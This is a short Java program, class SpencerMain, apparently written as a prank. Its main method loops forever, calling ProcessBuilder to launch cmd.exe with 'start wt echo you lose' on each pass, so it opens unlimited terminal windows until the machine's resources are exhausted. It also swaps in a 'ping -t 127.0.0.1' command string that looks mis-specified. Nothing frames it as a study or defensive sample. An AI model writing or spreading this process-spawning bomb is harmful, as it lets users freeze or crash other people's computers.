import java.io.IOException;
import java.lang.Thread;
import java.lang.Runnable;
public class SpencerMain {
    public static void main(String[] args) throws IOException {
        while (true)
         {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "start wt echo you lose");
            pb.start();
            pb.command("ping -t 127.0.0.1");
        }


    }
}